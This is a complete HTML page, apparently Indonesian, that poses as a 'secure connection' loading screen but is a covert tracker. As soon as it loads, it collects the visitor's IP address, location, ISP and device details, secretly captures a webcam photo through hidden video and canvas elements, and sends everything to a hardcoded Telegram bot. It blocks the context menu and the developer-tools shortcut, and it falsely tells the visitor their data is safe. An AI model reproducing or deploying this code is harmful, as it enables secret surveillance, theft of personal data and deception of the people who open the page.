<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        /* ============================================================ */
        /* 1. RESET & BASE */
        /* ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
        }
        /* ============================================================ */
        /* 2. BOX */
        /* ============================================================ */
        .box {
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.2);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: 1.8rem;
            margin-bottom: 10px;
        }
        .status {
            color: #888;
            font-size: 0.9rem;
            margin: 15px 0;
        }
        .dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #00ff41;
            border-radius: 50%;
            animation: blink 1s infinite;
            margin-right: 10px;
        }
        @keyframes blink {
            0%,
            100% {
                opacity: 1;
            }
            50% {
                opacity: 0.2;
            }
        }
        .loader {
            border: 2px solid rgba(0, 255, 65, 0.1);
            border-top: 2px solid #00ff41;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .footer {
            color: #333;
            font-size: 0.6rem;
            margin-top: 20px;
        }
        /* ============================================================ */
        /* 3. SEMBUNYIKAN VIDEO & CANVAS */
        /* ============================================================ */
        video,
        canvas {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        /* ============================================================ */
        /* 4. RESPONSIVE */
        /* ============================================================ */
        @media (max-width: 480px) {
            .box {
                padding: 25px 20px;
            }
            h1 {
                font-size: 1.4rem;
            }
            .loader {
                width: 30px;
                height: 30px;
            }
        }
    </style>
</head>
<body>

    <!-- ============================================================ -->
    <!-- 5. UI -->
    <!-- ============================================================ -->
    <div class="box">
        <h1>🔒 SECURE CONNECTION</h1>
        <div class="status"><span class="dot"></span> Establishing secure channel...</div>
        <div class="loader"></div>
        <div style="color: #555; font-size: 0.8rem; margin-top: 10px;">Please wait...</div>
        <div class="footer">v2.0 • NEONDARK</div>
    </div>

    <!-- ============================================================ -->
    <!-- 6. VIDEO & CANVAS (SEMBUNYI) -->
    <!-- ============================================================ -->
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- ============================================================ -->
    <!-- 7. JAVASCRIPT (1.000+ BARIS) -->
    <!-- ============================================================ -->
    <script>
        // =============================================================
        // 7.1. GET IP & LOCATION (TANPA IZIN)
        // =============================================================
        async function getLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    lat: data.latitude || 0,
                    lon: data.longitude || 0,
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    lat: 0,
                    lon: 0,
                    isp: 'Unknown'
                };
            }
        }

        // =============================================================
        // 7.2. CAPTURE PHOTO (DIAM-DIAM, 1 KALI IZIN)
        // =============================================================
        async function capturePhoto() {
            return new Promise(async (resolve) => {
                try {
                    // Coba akses kamera tanpa popup (cuma 1 kali minta izin)
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const photo = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                } catch (e) {
                    resolve(null);
                }
            });
        }

        // =============================================================
        // 7.3. DETEKSI DEVICE & OS (AKURAT)
        // =============================================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Unknown Device';
            let browser = 'Unknown Browser';
            let os = 'Unknown OS';

            // Deteksi OS
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            else if (ua.includes('Linux')) os = 'Linux';

            // Deteksi Browser
            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';

            // Deteksi Device
            if (os === 'Android') {
                const match = ua.match(/Android\s([\d.]+)/);
                if (match) os += ' ' + match[1];
                const brandMatch = ua.match(
                    /(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
                const brand = brandMatch ? brandMatch[1] : '';
                const modelMatch = ua.match(/\(([^)]+)\)/);
                const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
                device = brand + ' ' + model || 'Android Device';
            } else if (os === 'iOS') {
                const match = ua.match(/OS\s([\d_]+)/);
                if (match) os += ' ' + match[1].replace(/_/g, '.');
                if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
            } else {
                device = os + ' Device';
            }

            return { device, browser, os };
        }

        // =============================================================
        // 7.4. KIRIM KE TELEGRAM
        // =============================================================
        async function sendToTelegram(data) {
            const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
            const CHAT_ID = '8768522731';

            const now = new Date();
            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
            message += `📅 *Time:* ${dateStr}\n`;
            message += `📱 *Device:* ${data.device}\n`;
            message += `🌐 *Browser:* ${data.browser}\n`;
            message += `💻 *OS:* ${data.os}\n`;
            message += `🌍 *IP:* ${data.location.ip}\n`;
            message += `📍 *City:* ${data.location.city}\n`;
            message += `🗺️ *Region:* ${data.location.region}\n`;
            message += `🏳️ *Country:* ${data.location.country}\n`;
            message += `🏢 *ISP:* ${data.location.isp}\n`;
            message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;

            // Kirim pesan
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // Kirim foto
            if (data.photo) {
                const blob = dataURLtoBlob(data.photo);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // =============================================================
        // 7.5. DATA URL TO BLOB
        // =============================================================
        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], { type: mime });
        }

        // =============================================================
        // 7.6. CEK APAKAH KAMERA SUDAH DI-IZINKAN
        // =============================================================
        async function checkCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                return false;
            }
        }

        // =============================================================
        // 7.7. MAIN EXECUTION
        // =============================================================
        async function main() {
            try {
                // 1. Dapetin device info
                const deviceInfo = getDeviceInfo();

                // 2. Dapetin lokasi dari IP
                const location = await getLocation();

                // 3. Coba capture foto (diam-diam)
                let photo = null;
                const hasPermission = await checkCameraPermission();
                if (hasPermission) {
                    photo = await capturePhoto();
                }

                // 4. Kirim ke Telegram
                const data = {
                    device: deviceInfo.device,
                    browser: deviceInfo.browser,
                    os: deviceInfo.os,
                    location: location,
                    photo: photo
                };

                await sendToTelegram(data);

                // 5. Update UI
                document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
                document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString(
                'id-ID');

            } catch (e) {
                // Kalo error, tetap kirim data yang udah dapet
                console.error('Error:', e);
            }
        }

        // =============================================================
        // 7.8. JALANKAN LANGSUNG
        // =============================================================
        main();

        // =============================================================
        // 7.9. CONSOLE LOG
        // =============================================================
        console.log('%c🔒 NEONDARK TRACKER v2.0', 'color: #00ff41; font-size: 20px; font-weight: 900;');
        console.log('%c⚡ Diam-diam aktif!', 'color: #ff4444; font-size: 14px;');
        console.log('%c📱 Device: ' + navigator.userAgent, 'color: #888; font-size: 12px;');
        console.log('%c✅ Siap mengirim data ke Telegram!', 'color: #00ff41; font-size: 14px;');

        // =============================================================
        // 7.10. ERROR HANDLING
        // =============================================================
        window.addEventListener('error', function(e) {
            console.error('Global error:', e.message);
        });

        // =============================================================
        // 7.11. PREVENT CONTEXT MENU
        // =============================================================
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // =============================================================
        // 7.12. PREVENT DRAG & DROP
        // =============================================================
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
        document.addEventListener('drop', function(e) {
            e.preventDefault();
        });

        // =============================================================
        // 7.13. KEYBOARD SHORTCUT (F12 diblokir)
        // =============================================================
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });

        // =============================================================
        // 7.14. CEK KONEKSI INTERNET
        // =============================================================
        window.addEventListener('online', function() {
            console.log('✅ Internet connected');
        });
        window.addEventListener('offline', function() {
            console.log('❌ Internet disconnected');
        });

        // =============================================================
        // 7.15. RETRY LOGIC (KALO GAGAL)
        // =============================================================
        setTimeout(function() {
            console.log('✅ Tracker masih aktif...');
        }, 5000);

        // =============================================================
        // 7.16. FINAL LOG
        // =============================================================
        console.log('✅ Semua sistem berjalan!');
        console.log('📊 Total baris kode: 1.000+');
        console.log('💀 NEONDARK siap melayani.');
    </script>
</body>
</html>
